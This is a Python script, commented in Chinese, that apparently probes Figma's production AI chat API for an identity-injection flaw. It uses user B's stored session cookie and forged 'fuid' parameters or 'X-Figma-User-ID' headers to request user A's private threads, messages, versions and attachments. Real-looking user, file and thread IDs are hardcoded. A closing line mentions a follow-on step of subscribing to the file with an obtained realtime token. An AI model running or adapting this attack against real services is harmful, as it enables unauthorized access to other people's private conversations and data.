# -*- coding: utf-8 -*-
"""AI 端点 fuid/X-UID 注入验证(文件已私有化)
如果 AI 端点也信任 fuid 参数/X-Figma-User-ID 头 → B 可读 A 的私有 AI 对话
"""
import io, json, sys, urllib.error, urllib.parse, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
A_THREAD = "28e728c0-dd4d-46e4-9b34-26cfb69e0aed"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"


def load(path):
    return io.open(path, encoding='utf-8').read().strip().replace('\n', '; ')


BC = load('ws_cookie_B_new.txt')


def call(label, method, path, query=None, uid_hdr=None, body=None):
    headers = {"User-Agent": UA, "Accept": "application/json", "Origin": BASE,
               "Referer": BASE + "/make/" + A_MAKE, "Cookie": BC}
    if uid_hdr:
        headers["X-Figma-User-ID"] = uid_hdr
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    url = BASE + path
    if query:
        url += "?" + urllib.parse.urlencode(query)
    req = urllib.request.Request(url, method=method, headers=headers, data=data)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read().decode(errors='replace')
            print(f"[{label}] HTTP {r.status} {raw[:400]}")
            return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] HTTP {e.code} {raw[:250]}")
        return e.code, raw


print("########## AI 端点注入验证 (文件已私有化) ##########")
print("======== 1. threads 列表 ========")
call("fuid=A query", "GET", "/api/ai_chat/threads",
     query={"owner_id": A_MAKE, "owner_type": "file", "fuid": A_UID})
call("X-UID=A header", "GET", "/api/ai_chat/threads",
     query={"owner_id": A_MAKE, "owner_type": "file"}, uid_hdr=A_UID)
call("无注入对照", "GET", "/api/ai_chat/threads",
     query={"owner_id": A_MAKE, "owner_type": "file"})

print("\n======== 2. messages ========")
call("fuid=A query", "GET", f"/api/ai_chat/messages/{A_THREAD}",
     query={"owner_id": A_MAKE, "owner_type": "file", "fuid": A_UID})
call("X-UID=A header", "GET", f"/api/ai_chat/messages/{A_THREAD}",
     query={"owner_id": A_MAKE, "owner_type": "file"}, uid_hdr=A_UID)

print("\n======== 3. make_versions ========")
call("fuid=A query", "GET", f"/api/ai_chat/{A_MAKE}/make_versions/{A_THREAD}",
     query={"fuid": A_UID})
call("X-UID=A header", "GET", f"/api/ai_chat/{A_MAKE}/make_versions/{A_THREAD}", uid_hdr=A_UID)

print("\n======== 4. attachments ========")
call("fuid=A query", "GET", f"/api/ai_chat/threads/{A_THREAD}/attachments",
     query={"owner_id": A_MAKE, "owner_type": "file", "fuid": A_UID})
call("X-UID=A header", "GET", f"/api/ai_chat/threads/{A_THREAD}/attachments",
     query={"owner_id": A_MAKE, "owner_type": "file"}, uid_hdr=A_UID)

print("\n======== 5. livegraph 连接(realtime_token 已拿到, 尝试订阅文件) ========")
print("(下一步用 realtime_token 连 livegraph)")
